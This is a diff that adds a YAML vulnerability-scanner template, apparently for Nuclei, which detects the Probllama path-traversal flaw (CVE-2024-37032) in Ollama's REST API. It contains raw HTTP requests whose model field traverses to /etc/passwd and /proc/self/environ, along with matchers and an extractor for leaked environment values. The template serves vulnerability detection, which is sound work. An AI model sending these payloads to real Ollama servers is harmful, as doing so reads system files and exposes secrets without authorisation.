@@ -1,0 +1,67 @@
+id: ollama-path-traversal-rce
+
+info:
+  name: Ollama AI Platform Path Traversal RCE (CVE-2024-37032)
+  author: akm626
+  severity: critical
+  description: |
+    Detects the Probllama vulnerability (CVE-2024-37032) in Ollama AI platform which allows remote code execution through path traversal in the REST API. This vulnerability affects unauthenticated Ollama instances exposed to the internet.
+  reference:
+    - https://www.wiz.io/blog/probllama-ollama-vulnerability-cve-2024-37032
+    - https://noma.security/noma-research-discovers-rce-vulnerability-in-ai-development-platform-lightning-ai/
+  tags: ollama,rce,ai,probllama,cve-2024-37032,path-traversal
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/api/tags"
+      - "{{BaseURL}}/tags"
+
+  - raw:
+      - |
+        POST /api/generate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"model":".././../etc/passwd","prompt":"test","stream":false}
+      - |
+        POST /api/generate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"model":".././../proc/self/environ","prompt":"test","stream":false}
+      - |
+        POST /api/generate HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"model":"../../app/models","prompt":"test","stream":false}
+
+    req-condition: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+          - 'USER=(root|ollama)'
+          - '(?i)"error.*path.*traversal"'
+          - '(?i)"invalid.*model.*path"'
+
+      - type: status
+        status:
+          - 200
+          - 400
+          - 500
+
+      - type: word
+        part: header
+        words:
+          - "application/json"
+
+    extractors:
+      - type: regex
+        part: body
+        name: extracted_environ
+        regex:
+          - 'USER=(.*?)(?:&|\")'
